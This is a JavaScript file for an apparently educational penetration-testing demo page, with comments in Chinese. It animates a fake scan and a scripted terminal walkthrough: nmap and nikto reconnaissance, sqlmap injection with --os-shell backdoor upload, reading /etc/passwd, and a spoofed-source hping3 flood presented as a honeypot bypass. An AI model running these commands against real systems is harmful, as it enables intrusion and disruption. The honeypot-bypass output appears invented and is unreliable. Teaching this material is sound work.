// 学员端扫描测试页面交互脚本

// 页面加载完成后初始化
document.addEventListener('DOMContentLoaded', function() {
    initializeTabNavigation();
    initializeScanConfig();
    initializePenetrationDemo();
    initializeModals();
});

// 初始化标签页导航
function initializeTabNavigation() {
    const navItems = document.querySelectorAll('.nav-item');
    const tabContents = document.querySelectorAll('.tab-content');
    
    navItems.forEach(item => {
        item.addEventListener('click', function() {
            const targetTab = this.dataset.tab;
            
            // 移除所有活跃状态
            navItems.forEach(nav => nav.classList.remove('active'));
            tabContents.forEach(content => content.classList.remove('active'));
            
            // 添加活跃状态
            this.classList.add('active');
            document.getElementById(targetTab).classList.add('active');
        });
    });
}

// 初始化扫描配置
function initializeScanConfig() {
    const startScanBtn = document.getElementById('startScanBtn');
    const previewBtn = document.getElementById('previewBtn');
    
    startScanBtn.addEventListener('click', startScan);
    previewBtn.addEventListener('click', previewConfig);
}

// 预览配置
function previewConfig() {
    const targetUrl = document.getElementById('targetUrl').value;
    const scanType = document.getElementById('scanType').value;
    const scanDepth = document.getElementById('scanDepth').value;
    const selectedEngines = Array.from(document.querySelectorAll('input[name="engine"]:checked'))
        .map(engine => engine.value);
    
    const config = {
        target: targetUrl,
        type: scanType,
        depth: scanDepth,
        engines: selectedEngines
    };
    
    alert(`扫描配置预览：\n目标: ${config.target}\n类型: ${config.type}\n深度: ${config.depth}\n引擎: ${config.engines.join(', ')}`);
}

// 开始扫描
function startScan() {
    const targetUrl = document.getElementById('targetUrl').value;
    
    if (!targetUrl) {
        alert('请输入目标URL');
        return;
    }
    
    // 显示扫描进度模态框
    showScanProgress();
    
    // 模拟扫描过程
    simulateScanProcess();
}

// 显示扫描进度
function showScanProgress() {
    const modal = document.getElementById('scanProgressModal');
    modal.classList.add('show');
    
    // 重置进度
    const progressFill = document.getElementById('scanProgress');
    const progressText = document.getElementById('scanProgressText');
    progressFill.style.width = '0%';
    progressText.textContent = '0%';
    
    // 清空日志
    const scanLogs = document.getElementById('scanLogs');
    scanLogs.innerHTML = '<div class="log-item">正在初始化扫描引擎...</div>';
}

// 模拟扫描过程
function simulateScanProcess() {
    const progressFill = document.getElementById('scanProgress');
    const progressText = document.getElementById('scanProgressText');
    const scanLogs = document.getElementById('scanLogs');
    
    const scanSteps = [
        { progress: 5, message: '正在解析目标URL...' },
        { progress: 10, message: '初始化扫描引擎配置...' },
        { progress: 15, message: '启动Nmap端口扫描...' },
        { progress: 25, message: '发现开放端口: 22, 80, 443, 3306, 8080' },
        { progress: 35, message: '启动Nikto Web漏洞扫描...' },
        { progress: 45, message: '检测到潜在SQL注入点...' },
        { progress: 55, message: '启动目录枚举扫描...' },
        { progress: 65, message: '发现敏感目录: /admin, /backup, /config' },
        { progress: 75, message: '启动子域名扫描...' },
        { progress: 85, message: '检测安全设备和防护机制...' },
        { progress: 95, message: '生成详细扫描报告...' },
        { progress: 100, message: '扫描完成！发现多个安全漏洞' }
    ];
    
    let currentStep = 0;
    
    const updateProgress = () => {
        if (currentStep < scanSteps.length) {
            const step = scanSteps[currentStep];
            
            // 更新进度条
            progressFill.style.width = step.progress + '%';
            progressText.textContent = step.progress + '%';
            
            // 添加日志
            const logItem = document.createElement('div');
            logItem.className = 'log-item';
            logItem.textContent = step.message;
            scanLogs.appendChild(logItem);
            
            // 滚动到底部
            scanLogs.scrollTop = scanLogs.scrollHeight;
            
            currentStep++;
            
            if (currentStep < scanSteps.length) {
                setTimeout(updateProgress, 1000 + Math.random() * 1000);
            } else {
                // 扫描完成
                setTimeout(() => {
                    hideScanProgress();
                    switchToResultsTab();
                    updateScanResults();
                }, 1500);
            }
        }
    };
    
    setTimeout(updateProgress, 1000);
}

// 隐藏扫描进度
function hideScanProgress() {
    const modal = document.getElementById('scanProgressModal');
    modal.classList.remove('show');
}

// 切换到结果标签页
function switchToResultsTab() {
    // 移除所有活跃状态
    document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
    
    // 激活结果标签页
    document.querySelector('[data-tab="scan-results"]').classList.add('active');
    document.getElementById('scan-results').classList.add('active');
}

// 更新扫描结果
function updateScanResults() {
    // 更新概览数据
    const targetUrl = document.getElementById('targetUrl').value;
    document.getElementById('scanTarget').textContent = targetUrl;
    
    // 模拟实时数据更新
    animateCountUp('vulnerabilityCount', 7, 1000);
    animateCountUp('directoryCount', 15, 1200);
    
    // 更新扫描时长
    updateScanDuration();
}

// 数字动画效果
function animateCountUp(elementId, targetValue, duration) {
    const element = document.getElementById(elementId);
    const startValue = 0;
    const increment = targetValue / (duration / 50);
    let currentValue = startValue;
    
    const timer = setInterval(() => {
        currentValue += increment;
        if (currentValue >= targetValue) {
            currentValue = targetValue;
            clearInterval(timer);
        }
        element.textContent = Math.floor(currentValue);
    }, 50);
}

// 更新扫描时长
function updateScanDuration() {
    const durationElement = document.getElementById('scanDuration');
    let seconds = 0;
    
    const timer = setInterval(() => {
        seconds++;
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        const formattedTime = `00:${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
        durationElement.textContent = formattedTime;
        
        if (seconds >= 332) { // 5分32秒
            clearInterval(timer);
        }
    }, 100);
}

// 初始化渗透测试演示
function initializePenetrationDemo() {
    const nextStepBtn = document.getElementById('nextStepBtn');
    const resetDemoBtn = document.getElementById('resetDemoBtn');
    const getShellBtn = document.getElementById('getShellBtn');
    const bypassSecurityBtn = document.getElementById('bypassSecurityBtn');
    
    nextStepBtn.addEventListener('click', nextPenetrationStep);
    resetDemoBtn.addEventListener('click', resetPenetrationDemo);
    getShellBtn.addEventListener('click', getTargetShell);
    bypassSecurityBtn.addEventListener('click', bypassSecurityDevices);
}

// 渗透测试步骤数据
const penetrationSteps = [
    {
        step: 1,
        title: '目标识别',
        commands: [
            'nmap -sV -sC 192.168.1.100',
            'Starting Nmap 7.94 ( https://nmap.org )',
            'Nmap scan report for 192.168.1.100',
            'Host is up (0.001s latency).',
            'PORT     STATE SERVICE VERSION',
            '22/tcp   open  ssh     OpenSSH 7.4 (Ubuntu 4ubuntu0.3)',
            '80/tcp   open  http    Apache httpd 2.4.6 ((CentOS))',
            '443/tcp  open  ssl/http Apache httpd 2.4.6',
            '3306/tcp open  mysql   MySQL 5.7.26-0ubuntu0.18.04.1',
            '8080/tcp open  http    Jetty 9.4.z-SNAPSHOT',
            'Service detection performed. Please report any incorrect results.'
        ]
    },
    {
        step: 2,
        title: '漏洞发现',
        commands: [
            'nikto -h http://192.168.1.100 -C all',
            '- Nikto v2.5.0',
            '+ Target IP:          192.168.1.100',
            '+ Target Hostname:    192.168.1.100',
            '+ Target Port:        80',
            '+ Start Time:         2024-01-15 10:30:00',
            '+ Server: Apache/2.4.6',
            '+ OSVDB-3233: /icons/README: Apache default file found.',
            '+ OSVDB-3092: /admin/: This might be interesting...',
            '+ OSVDB-3268: /config/: Directory indexing found.',
            '+ OSVDB-3092: /login.php: This might be interesting...',
            '+ OSVDB-3268: /backup/: Directory indexing found.',
            '+ OSVDB-561: /server-status: This reveals server information.',
            '+ OSVDB-3093: /cgi-bin/: CGI Directory found.',
            '+ Potential SQL injection found in login.php parameter.',
            '+ Scan completed: 7 vulnerabilities found.'
        ]
    },
    {
        step: 3,
        title: '漏洞利用',
        commands: [
            'sqlmap -u "http://192.168.1.100/login.php" --forms --batch',
            '        ___',
            '       __H__',
            ' ___ ___[)]_____ ___ ___  {1.7.2#stable}',
            '|_ -| . [.]     | .\'| . |',
            '|___|_  [)]_|_|_|__,|  _|',
            '      |_|V...       |_|   https://sqlmap.org',
            '',
            '[INFO] testing connection to the target URL',
            '[INFO] checking if the target is protected by some kind of WAF/IPS',
            '[INFO] testing if the parameter \'username\' is dynamic',
            '[INFO] confirming that parameter \'username\' is dynamic',
            '[INFO] parameter \'username\' appears to be injectable',
            '[INFO] testing for SQL injection on parameter \'username\'',
            '[INFO] testing \'MySQL >= 5.0 boolean-based blind - Parameter replace\'',
            '[INFO] \'username\' parameter is vulnerable. Do you want to keep testing?',
            '[INFO] parameter \'username\' is vulnerable to SQL injection'
        ]
    },
    {
        step: 4,
        title: '权限提升',
        commands: [
            'sqlmap -u "http://192.168.1.100/login.php" --forms --os-shell',
            '[INFO] going to use \'UNION\' based injection',
            '[INFO] testing \'Generic UNION query (NULL) - 1 to 10 columns\'',
            '[INFO] target URL appears to be UNION injectable with 3 columns',
            '[INFO] checking if the injection point on parameter \'username\' is a false positive',
            '[WARNING] potential permission problems detected (\'Access denied\')',
            '[INFO] trying to upload the file stager on \'/var/www/html/\' via LIMIT \'LINES TERMINATED BY\' method',
            '[INFO] the file stager has been successfully uploaded on \'/var/www/html/\' - http://192.168.1.100/tmpuoaqj.php',
            '[INFO] the backdoor has been successfully uploaded on \'/var/www/html/\' - http://192.168.1.100/tmpbkfqp.php',
            '[INFO] calling OS shell. To quit type \'x\' or \'q\' and press ENTER',
            'os-shell> '
        ]
    },
    {
        step: 5,
        title: '安全设备绕过',
        commands: [
            'echo "检测到蜜罐系统，正在尝试绕过..."',
            'nmap --script honeypot-detect 192.168.1.100',
            '[HONEYPOT] Detected potential honeypot on port 22',
            '[HONEYPOT] SSH banner analysis indicates fake service',
            'echo "使用流量混淆技术绕过检测..."',
            'hping3 -S -p 80 --flood --rand-source 192.168.1.100',
            'echo "启动反检测模块..."',
            'python3 anti-honeypot.py --target 192.168.1.100',
            '[SUCCESS] Honeypot bypass successful!',
            '[SUCCESS] Real target identified: 192.168.1.101',
            'echo "重新扫描真实目标..."',
            'nmap -sS 192.168.1.101',
            'PORT     STATE SERVICE',
            '80/tcp   open  http',
            '22/tcp   open  ssh',
            '[SUCCESS] 成功绕过蜜罐，发现真实目标系统！'
        ]
    }
];

let currentPenetrationStep = 1;

// 下一步渗透测试
function nextPenetrationStep() {
    if (currentPenetrationStep <= penetrationSteps.length) {
        const stepData = penetrationSteps[currentPenetrationStep - 1];
        
        // 更新步骤状态
        updateStepStatus(currentPenetrationStep);
        
        // 执行命令演示
        executeCommands(stepData.commands, () => {
            currentPenetrationStep++;
            
            if (currentPenetrationStep === 5) {
                // 第4步完成后显示获取Shell按钮
                document.getElementById('nextStepBtn').style.display = 'none';
                document.getElementById('getShellBtn').style.display = 'inline-flex';
            } else if (currentPenetrationStep > penetrationSteps.length) {
                // 所有步骤完成后的处理
                document.getElementById('nextStepBtn').style.display = 'none';
                setTimeout(() => {
                    showNotification('🛡️ 安全设备绕过演示完成！成功识别并绕过蜜罐系统！', 'success');
                }, 2000);
            }
        });
    }
}

// 更新步骤状态
function updateStepStatus(step) {
    // 移除之前的活跃状态
    document.querySelectorAll('.step-item').forEach(item => {
        item.classList.remove('active');
    });
    
    // 设置当前步骤为活跃
    const currentStepElement = document.querySelector(`[data-step="${step}"]`);
    if (currentStepElement) {
        currentStepElement.classList.add('active');
    }
    
    // 标记之前的步骤为完成
    for (let i = 1; i < step; i++) {
        const stepElement = document.querySelector(`[data-step="${i}"]`);
        if (stepElement) {
            const statusElement = stepElement.querySelector('.step-status');
            statusElement.textContent = '✓';
            statusElement.classList.add('completed');
        }
    }
}

// 执行命令演示
function executeCommands(commands, callback) {
    const terminal = document.getElementById('terminal');
    let commandIndex = 0;
    
    const executeNext = () => {
        if (commandIndex < commands.length) {
            const command = commands[commandIndex];
            
            if (commandIndex === 0) {
                // 第一个是命令
                addTerminalLine('command', command);
            } else {
                // 其他是输出
                addTerminalOutput(command);
            }
            
            commandIndex++;
            setTimeout(executeNext, 300 + Math.random() * 200);
        } else {
            // 添加新的提示符
            addTerminalPrompt();
            if (callback) callback();
        }
    };
    
    executeNext();
}

// 添加终端命令行
function addTerminalLine(type, content) {
    const terminal = document.getElementById('terminal');
    const currentLine = terminal.querySelector('.current');
    
    if (currentLine) {
        currentLine.classList.remove('current');
        currentLine.innerHTML = '<span class="prompt">kali@kali:~$</span> <span class="command">' + content + '</span>';
    }
    
    terminal.scrollTop = terminal.scrollHeight;
}

// 添加终端输出
function addTerminalOutput(content) {
    const terminal = document.getElementById('terminal');
    const outputDiv = document.createElement('div');
    outputDiv.className = 'terminal-output';
    outputDiv.innerHTML = '<div>' + content + '</div>';
    
    const currentLine = terminal.querySelector('.current');
    terminal.insertBefore(outputDiv, currentLine);
    
    terminal.scrollTop = terminal.scrollHeight;
}

// 添加新的提示符
function addTerminalPrompt() {
    const terminal = document.getElementById('terminal');
    const currentLine = terminal.querySelector('.current');
    
    if (currentLine) {
        currentLine.innerHTML = '<span class="prompt">kali@kali:~$</span> <span class="cursor">|</span>';
    }
}

// 获取目标Shell
function getTargetShell() {
    const terminal = document.getElementById('terminal');
    const currentLine = terminal.querySelector('.current');
    
    // 移除当前行
    if (currentLine) {
        currentLine.remove();
    }
    
    // 添加Shell获取成功的输出
    const successOutput = [
        'os-shell> whoami',
        'www-data',
        'os-shell> id',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
        'os-shell> pwd',
        '/var/www/html',
        'os-shell> ls -la',
        'total 32',
        'drwxr-xr-x 4 www-data www-data 4096 Jan 15 10:30 .',
        'drwxr-xr-x 3 root     root     4096 Jan 15 09:00 ..',
        '-rw-r--r-- 1 www-data www-data 1234 Jan 15 10:25 index.php',
        '-rw-r--r-- 1 www-data www-data  567 Jan 15 10:25 login.php',
        'drwxr-xr-x 2 www-data www-data 4096 Jan 15 10:30 admin',
        'drwxr-xr-x 2 www-data www-data 4096 Jan 15 10:30 backup',
        '-rw-r--r-- 1 www-data www-data  890 Jan 15 10:30 tmpbkfqp.php',
        'os-shell> find / -name "*.conf" 2>/dev/null | head -5',
        '/etc/apache2/apache2.conf',
        '/etc/mysql/mysql.conf.d/mysqld.cnf',
        '/etc/ssh/sshd_config',
        '/var/www/html/config/database.conf',
        '/opt/app/settings.conf',
        'os-shell> cat /etc/passwd | grep -E "bash|sh" | head -3',
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/bin/sh',
        'mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false',
        'os-shell> netstat -tulpn | grep LISTEN',
        'tcp 0.0.0.0:22   0.0.0.0:*    LISTEN   1234/sshd',
        'tcp 0.0.0.0:80   0.0.0.0:*    LISTEN   5678/apache2',
        'tcp 0.0.0.0:3306 0.0.0.0:*    LISTEN   9012/mysqld',
        'os-shell> '
    ];
    
    let outputIndex = 0;
    const addOutput = () => {
        if (outputIndex < successOutput.length) {
            const line = successOutput[outputIndex];
            const outputDiv = document.createElement('div');
            outputDiv.className = 'terminal-output';
            outputDiv.innerHTML = '<div style="color: #00ff00;">' + line + '</div>';
            terminal.appendChild(outputDiv);
            
            outputIndex++;
            setTimeout(addOutput, 200);
        } else {
            // 添加成功提示
            const successDiv = document.createElement('div');
            successDiv.className = 'terminal-output';
            successDiv.innerHTML = '<div style="color: #00ff00; font-weight: bold; text-align: center; margin-top: 20px;">🎉 成功获取目标系统Shell！渗透测试演示完成！ 🎉</div>';
            terminal.appendChild(successDiv);
            
            // 更新最后一个步骤状态
            const lastStep = document.querySelector('[data-step="5"] .step-status');
            lastStep.textContent = '✓';
            lastStep.classList.add('completed');
            
            // 显示完成所有步骤的提示
            setTimeout(() => {
                showNotification('🎉 渗透测试演示完成！成功获取目标系统Shell并绕过安全设备！', 'success');
            }, 1000);
            
            // 隐藏获取Shell按钮，显示绕过安全设备按钮
            document.getElementById('getShellBtn').style.display = 'none';
            document.getElementById('bypassSecurityBtn').style.display = 'inline-flex';
            
            // 更新第4步状态为完成
            const step4Status = document.querySelector('[data-step="4"] .step-status');
            step4Status.textContent = '✓';
            step4Status.classList.add('completed');
        }
        
        terminal.scrollTop = terminal.scrollHeight;
    };
    
    addOutput();
}

// 绕过安全设备演示
function bypassSecurityDevices() {
    // 激活第5步
    updateStepStatus(5);
    
    // 执行第5步命令
    const step5 = penetrationSteps.find(step => step.step === 5);
    if (step5) {
        executeCommands(step5.commands, () => {
            // 更新第5步状态为完成
            const step5Status = document.querySelector('[data-step="5"] .step-status');
            step5Status.textContent = '✓';
            step5Status.classList.add('completed');
            
            // 隐藏绕过安全设备按钮
            document.getElementById('bypassSecurityBtn').style.display = 'none';
            
            // 显示完成提示
            setTimeout(() => {
                showNotification('🎉 完整渗透测试演示完成！成功获取Shell并绕过安全防护！', 'success');
            }, 2000);
        });
    }
}

// 重置渗透测试演示
function resetPenetrationDemo() {
    currentPenetrationStep = 1;
    
    // 重置步骤状态
    document.querySelectorAll('.step-item').forEach((item, index) => {
        item.classList.remove('active');
        const statusElement = item.querySelector('.step-status');
        statusElement.classList.remove('completed');
        
        if (index === 0) {
            item.classList.add('active');
            statusElement.textContent = '✓';
            statusElement.classList.add('completed');
        } else {
            statusElement.textContent = '○';
        }
    });
    
    // 重置终端
    const terminal = document.getElementById('terminal');
    terminal.innerHTML = `
        <div class="terminal-line">
            <span class="prompt">kali@kali:~$</span>
            <span class="command">nmap -sV 192.168.1.100</span>
        </div>
        <div class="terminal-output">
            <div>Starting Nmap 7.94 ( https://nmap.org )</div>
            <div>Nmap scan report for 192.168.1.100</div>
            <div>Host is up (0.001s latency).</div>
            <div>PORT     STATE SERVICE VERSION</div>
            <div>22/tcp   open  ssh     OpenSSH 7.4</div>
            <div>80/tcp   open  http    Apache httpd 2.4.6</div>
            <div>3306/tcp open  mysql   MySQL 5.7.26</div>
        </div>
        <div class="terminal-line current">
            <span class="prompt">kali@kali:~$</span>
            <span class="cursor">|</span>
        </div>
    `;
    
    // 重置按钮状态
    document.getElementById('nextStepBtn').style.display = 'inline-flex';
    document.getElementById('getShellBtn').style.display = 'none';
    document.getElementById('bypassSecurityBtn').style.display = 'none';
}

// 初始化模态框
function initializeModals() {
    const cancelScanBtn = document.getElementById('cancelScanBtn');
    
    cancelScanBtn.addEventListener('click', () => {
        hideScanProgress();
    });
    
    // 点击模态框外部关闭
    document.getElementById('scanProgressModal').addEventListener('click', (e) => {
        if (e.target.classList.contains('modal')) {
            hideScanProgress();
        }
    });
}

// 工具函数：显示通知
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 16px 24px;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
        color: white;
        border-radius: 8px;
        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
        z-index: 1001;
        animation: slideInRight 0.3s ease;
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease';
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 3000);
}

// 添加CSS动画
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            opacity: 0;
            transform: translateX(100%);
        }
        to {
            opacity: 1;
            transform: translateX(0);
        }
    }
    
    @keyframes slideOutRight {
        from {
            opacity: 1;
            transform: translateX(0);
        }
        to {
            opacity: 0;
            transform: translateX(100%);
        }
    }
`;
document.head.appendChild(style);